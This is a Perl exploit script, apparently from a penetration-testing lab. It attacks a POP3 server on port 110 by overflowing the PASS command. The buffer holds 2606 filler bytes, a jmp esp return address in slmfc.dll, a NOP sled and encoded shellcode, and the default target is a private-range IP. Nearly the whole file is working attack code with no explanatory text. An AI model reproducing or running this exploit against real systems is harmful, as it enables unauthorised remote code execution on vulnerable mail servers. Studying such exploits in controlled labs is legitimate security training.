#!/usr/bin/perl

use IO::Socket::INET;
my $bad = "\x00\x0a\x0d";
# 5F4A358F# jmp esp in slmfc.dll
my $shellcode = "\xdb\xc4\xba\x39\xa0\x2f\xdc\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x52\x31\x55\x17\x03\x55\x17\x83\xfc\xa4\xcd\x29\x02\x4c\x93\xd2\xfa\x8d\xf4\x5b\x1f\xbc\x34\x3f\x54\xef\x84\x4b\x38\x1c\x6e\x19\xa8\x97\x02\xb6\xdf\x10\xa8\xe0\xee\xa1\x81\xd1\x71\x22\xd8\x05\x51\x1b\x13\x58\x90\x5c\x4e\x91\xc0\x35\x04\x04\xf4\x32\x50\x95\x7f\x08\x74\x9d\x9c\xd9\x77\x8c\x33\x51\x2e\x0e\xb2\xb6\x5a\x07\xac\xdb\x67\xd1\x47\x2f\x13\xe0\x81\x61\xdc\x4f\xec\x4d\x2f\x91\x29\x69\xd0\xe4\x43\x89\x6d\xff\x90\xf3\xa9\x8a\x02\x53\x39\x2c\xee\x65\xee\xab\x65\x69\x5b\xbf\x21\x6e\x5a\x6c\x5a\x8a\xd7\x93\x8c\x1a\xa3\xb7\x08\x46\x77\xd9\x09\x22\xd6\xe6\x49\x8d\x87\x42\x02\x20\xd3\xfe\x49\x2d\x10\x33\x71\xad\x3e\x44\x02\x9f\xe1\xfe\x8c\x93\x6a\xd9\x4b\xd3\x40\x9d\xc3\x2a\x6b\xde\xca\xe8\x3f\x8e\x64\xd8\x3f\x45\x74\xe5\x95\xca\x24\x49\x46\xab\x94\x29\x36\x43\xfe\xa5\x69\x73\x01\x6c\x02\x1e\xf8\xe7\x27\xd4\x02\x4b\x5f\xe8\x02\xaa\x1b\x65\xe4\xc6\x4b\x20\xbf\x7e\xf5\x69\x4b\x1e\xfa\xa7\x36\x20\x70\x44\xc7\xef\x71\x21\xdb\x98\x71\x7c\x81\x0f\x8d\xaa\xad\xcc\x1c\x31\x2d\x9a\x3c\xee\x7a\xcb\xf3\xe7\xee\xe1\xaa\x51\x0c\xf8\x2b\x99\x94\x27\x88\x24\x15\xa5\xb4\x02\x05\x73\x34\x0f\x71\x2b\x63\xd9\x2f\x8d\xdd\xab\x99\x47\xb1\x65\x4d\x11\xf9\xb5\x0b\x1e\xd4\x43\xf3\xaf\x81\x15\x0c\x1f\x46\x92\x75\x7d\xf6\x5d\xac\xc5\x06\x14\xec\x6c\x8f\xf1\x65\x2d\xd2\x01\x50\x72\xeb\x81\x50\x0b\x08\x99\x11\x0e\x54\x1d\xca\x62\xc5\xc8\xec\xd1\xe6\xd8";
my $shellcode = "\xb8\x7c\xf4\x38\xbb\xd9\xc7\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x52\x31\x45\x12\x83\xed\xfc\x03\x39\xfa\xda\x4e\x3d\xea\x99\xb1\xbd\xeb\xfd\x38\x58\xda\x3d\x5e\x29\x4d\x8e\x14\x7f\x62\x65\x78\x6b\xf1\x0b\x55\x9c\xb2\xa6\x83\x93\x43\x9a\xf0\xb2\xc7\xe1\x24\x14\xf9\x29\x39\x55\x3e\x57\xb0\x07\x97\x13\x67\xb7\x9c\x6e\xb4\x3c\xee\x7f\xbc\xa1\xa7\x7e\xed\x74\xb3\xd8\x2d\x77\x10\x51\x64\x6f\x75\x5c\x3e\x04\x4d\x2a\xc1\xcc\x9f\xd3\x6e\x31\x10\x26\x6e\x76\x97\xd9\x05\x8e\xeb\x64\x1e\x55\x91\xb2\xab\x4d\x31\x30\x0b\xa9\xc3\x95\xca\x3a\xcf\x52\x98\x64\xcc\x65\x4d\x1f\xe8\xee\x70\xcf\x78\xb4\x56\xcb\x21\x6e\xf6\x4a\x8c\xc1\x07\x8c\x6f\xbd\xad\xc7\x82\xaa\xdf\x8a\xca\x1f\xd2\x34\x0b\x08\x65\x47\x39\x97\xdd\xcf\x71\x50\xf8\x08\x75\x4b\xbc\x86\x88\x74\xbd\x8f\x4e\x20\xed\xa7\x67\x49\x66\x37\x87\x9c\x29\x67\x27\x4f\x8a\xd7\x87\x3f\x62\x3d\x08\x1f\x92\x3e\xc2\x08\x39\xc5\x85\x3c\xb5\xc5\xe6\x29\xcb\xc5\x09\x11\x42\x23\x63\x75\x03\xfc\x1c\xec\x0e\x76\xbc\xf1\x84\xf3\xfe\x7a\x2b\x04\xb0\x8a\x46\x16\x25\x7b\x1d\x44\xe0\x84\x8b\xe0\x6e\x16\x50\xf0\xf9\x0b\xcf\xa7\xae\xfa\x06\x2d\x43\xa4\xb0\x53\x9e\x30\xfa\xd7\x45\x81\x05\xd6\x08\xbd\x21\xc8\xd4\x3e\x6e\xbc\x88\x68\x38\x6a\x6f\xc3\x8a\xc4\x39\xb8\x44\x80\xbc\xf2\x56\xd6\xc0\xde\x20\x36\x70\xb7\x74\x49\xbd\x5f\x71\x32\xa3\xff\x7e\xe9\x67\x1f\x9d\x3b\x92\x88\x38\xae\x1f\xd5\xba\x05\x63\xe0\x38\xaf\x1c\x17\x20\xda\x19\x53\xe6\x37\x50\xcc\x83\x37\xc7\xed\x81";
my $step = 100;
my $count = $step;
my $buffer = "A" x 2606 . "\x8f\x35\x4a\x5f" . "\x90" x 32 . $shellcode .
    "C" x (3500-2606-4-32-length($shellcode));

my $replies = {};

while(1) {
    my $s = IO::Socket::INET->new(
        PeerHost => $ARGV[1] || "10.11.25.184",
        PeerPort => $ARGV[2] || 110,
        Proto => $ARGV[3] || 'tcp',
    ) or die $!;

    my $res = <$s>; # discard the welcome / at least for now
    print $res,"\n";

    print "Sending: USER username\n";
    print $s "USER username\r\n";
    $res = <$s>;
    print $res,"\n";
    #my $buffer = "A" x 2700;
    #my $buffer = $buffer x $count;
    print "[+] Sending count: $count\n";
    $count += $step;
    print "Sending: PASS $buffer\r\n";
    print $s "PASS $buffer\r\n";
    chomp($res = <$s>);
    print $res,"\n";
    $resplies->{$res}++;

    close $s;

    sleep 1;
    exit;

}





